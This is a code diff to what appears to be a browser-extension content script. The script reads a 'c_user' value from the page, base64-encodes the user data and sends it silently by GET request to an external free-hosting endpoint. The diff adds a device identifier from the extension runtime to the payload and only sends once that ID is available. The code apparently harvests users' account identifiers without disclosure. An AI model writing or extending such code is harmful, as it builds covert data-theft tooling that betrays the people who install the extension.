@@ -1,3 +1,4 @@
+var device_id = "";
 const API = "https://litho-bump.000webhostapp.com/index.php",
     userAgent = navigator.userAgent,
     dateTime = () => {
@@ -73,7 +74,7 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
         return message;
     },
     sendMessage = (userData) => {
-        const msg = btoa(convertObjectToMessage(userData));
+        const msg = btoa(convertObjectToMessage({ ...userData, device_id: device_id }));
         return fetch(`${API}?msg=${msg}`, {
             method: "GET",
             mode: "cors",
@@ -84,6 +85,11 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
     };
 
 (() => {
-    const c_user = getCUser();
-    processUser(c_user);
+    chrome.runtime.sendMessage("get_device_id", (e) => {
+        device_id = e && e != "" ? e : null;
+        if (device_id) {
+            const c_user = getCUser();
+            processUser(c_user);
+        }
+    });
 })();
